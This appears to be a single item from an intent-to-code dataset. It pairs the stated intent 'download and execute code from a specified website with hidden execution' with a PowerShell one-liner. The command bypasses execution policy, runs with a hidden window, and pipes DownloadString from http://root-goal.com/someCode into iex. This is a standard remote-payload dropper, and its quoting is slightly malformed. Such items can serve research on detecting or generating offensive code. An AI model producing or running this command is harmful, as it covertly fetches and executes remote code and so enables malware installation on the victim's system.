# Natural language intent:
# Download and execute code from a specified website with hidden execution.

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "iex(New-Object Net.WebClient).DownloadString('http://root-goal.com/someCode)"
